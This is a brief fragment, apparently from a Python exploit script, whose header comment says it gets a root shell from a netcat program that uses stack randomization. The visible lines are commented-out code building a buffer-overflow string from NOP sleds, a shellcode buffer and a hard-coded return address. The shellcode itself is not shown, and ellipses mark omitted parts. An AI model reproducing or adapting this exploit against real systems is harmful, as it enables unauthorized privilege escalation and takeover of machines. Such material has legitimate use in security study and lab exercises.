...
#Brief Description: Exploit to get root shell from a net cat program which has stack randomization.
...
#print(padding)
#overflow_string = b"\x90"*785+buf+b"\x90"*30+b"\xa7\x2b\x12\x42"+b"\x90"*30+buf
